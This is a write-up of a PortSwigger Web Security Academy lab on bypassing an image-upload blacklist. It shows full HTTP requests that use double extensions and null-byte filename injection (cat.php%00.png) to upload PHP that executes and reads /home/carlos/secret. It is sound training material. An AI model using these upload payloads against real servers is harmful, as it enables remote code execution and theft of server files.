# Web shell upload via obfuscated file extension

This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed using obfuscation techniques.

To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: `wiener:peter`

---

## 1. Detection

- Opened the Lab URL and clicked on <a href="/my-account?id=wiener">My Account</a> and logged in with given credentials `wiener:peter`.
- The page had option to upload an avatar.
- I uploaded a normal image file and captured the request in <a href="https://portswigger.net/burp/downloads">BurpSuite</a>.
- A `POST /my-account/avatar` was being sent, I right clicked on the request and sent it to `Repeater` tab to start playing with it.
- I tried uploading a PHP file directly with `cat.php` as the filename:

```http
POST /my-account/avatar HTTP/2
Host: <REDACTED_HOST>
Cookie: session=<REDACTED_SESSION>
Content-Length: 424
Cache-Control: max-age=0
Sec-Ch-Ua: <REDACTED>
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: <REDACTED>
Dnt: 1
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarywkTjN62YyTlA2n2s
User-Agent: <REDACTED>
Origin: <REDACTED_ORIGIN>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: <REDACTED_REFERER>
Accept-Encoding: gzip, deflate, br
Accept-Language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i

------WebKitFormBoundarywkTjN62YyTlA2n2s
Content-Disposition: form-data; name="avatar"; filename="cat.php"
Content-Type: text/plain

<?php
    echo 1+1;
?>
------WebKitFormBoundarywkTjN62YyTlA2n2s
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundarywkTjN62YyTlA2n2s
Content-Disposition: form-data; name="csrf"

<REDACTED_CSRF_TOKEN>
------WebKitFormBoundarywkTjN62YyTlA2n2s--
```

- The server rejected it with a `403 Forbidden`:

```http
HTTP/2 403 Forbidden
Date: Mon, 15 Jun 2026 05:47:59 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 171

Sorry, only JPG & PNG files are allowed
Sorry, there was an error uploading your file.<p><a href="/my-account" title="Return to previous page">« Back to My Account</a></p>
```

- This confirmed the server was blacklisting the `.php` extension outright.

---

## 2. Probing the Blacklist

- I tried appending `.png` after `.php` in the filename — `cat.php.png` — to see if the server was only checking the last extension:

```http
------WebKitFormBoundarywkTjN62YyTlA2n2s
Content-Disposition: form-data; name="avatar"; filename="cat.php.png"
Content-Type: text/plain

<?php
    echo 1+1;
?>
------WebKitFormBoundarywkTjN62YyTlA2n2s
```

- The server accepted it with a `200 OK`:

```http
HTTP/2 200 OK
Date: Mon, 15 Jun 2026 05:48:31 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 132

The file avatars/cat.php.png has been uploaded.<p><a href="/my-account" title="Return to previous page">« Back to My Account</a></p>
```

- However, visiting `GET /files/avatars/cat.php.png` did not execute the code — the server returned the raw PHP source as plain text:

```
<?php
    echo 1+1;
?>
```

- This meant the server was saving the file with the full name `cat.php.png` and Apache was serving it as a static file since the final extension was `.png`, not `.php`. The double-extension trick alone wasn't enough.

---

## 3. Bypassing via Null Byte Injection (`%00`)

- The key insight: if the server validates the filename as a string but passes it to a backend function that treats a null byte (`%00`) as a string terminator, everything after `%00` gets silently dropped — so `cat.php%00.png` is seen as `cat.php` by the backend while the validator sees `cat.php%00.png` and considers it a `.png` file.
- I modified the filename to `cat.php%00.png` and updated the payload to `<?php echo 7*7; ?>` to clearly distinguish execution from a static response:

```http
------WebKitFormBoundarywkTjN62YyTlA2n2s
Content-Disposition: form-data; name="avatar"; filename="cat.php%00.png"
Content-Type: text/plain

<?php
    echo 7*7;
?>
------WebKitFormBoundarywkTjN62YyTlA2n2s
```

- The server responded with `200 OK` and — crucially — the response showed the file was saved as `cat.php`, not `cat.php%00.png`:

```http
HTTP/2 200 OK
Date: Mon, 15 Jun 2026 05:49:58 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 128

The file avatars/cat.php has been uploaded.<p><a href="/my-account" title="Return to previous page">« Back to My Account</a></p>
```

- The null byte caused the backend to truncate the filename at `%00`, stripping `.png` entirely and saving the file as `cat.php`.
- Visited `GET /files/avatars/cat.php` — the server returned `49`, confirming the PHP code was executed.

> **Why this works:** `%00` is the URL-encoded representation of the null byte (`\0`), which in C-based string handling (used internally by many web servers and PHP itself) signals the end of a string. The validator sees `cat.php%00.png` and passes the `.png` check, but the filesystem call truncates at the null byte and writes the file as `cat.php`. This is a classic null byte injection vulnerability.

---

## 4. Solve the Challenge

- With code execution confirmed, I modified the payload to read the secret file:

```http
------WebKitFormBoundarywkTjN62YyTlA2n2s
Content-Disposition: form-data; name="avatar"; filename="cat.php%00.png"
Content-Type: text/plain

<?php
    echo file_get_contents('/home/carlos/secret');
?>
------WebKitFormBoundarywkTjN62YyTlA2n2s
```

- Visited `GET /files/avatars/cat.php` — the server printed the flag:
`ZLIhun2cii05ApXIEKEq8N0zc6SUA5Kj`
- Submitted the flag and solved the lab.